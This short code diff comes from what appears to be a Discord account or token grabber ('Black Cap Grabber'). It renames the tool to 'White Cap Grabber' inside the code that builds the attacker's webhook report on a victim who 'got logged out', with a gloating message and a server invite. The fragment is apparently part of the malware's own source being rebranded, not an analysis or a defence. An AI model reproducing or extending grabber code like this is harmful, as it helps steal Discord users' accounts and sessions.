@@ -175,10 +175,10 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "Black Cap Grabber",
+							username: "White Cap Grabber",
 							content: "",
 							embeds: [{
-								title: "Black Caped User got logged out",
+								title: "White Caped User got logged out",
 								description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 								color: config["embed-color"],
 								fields: [{
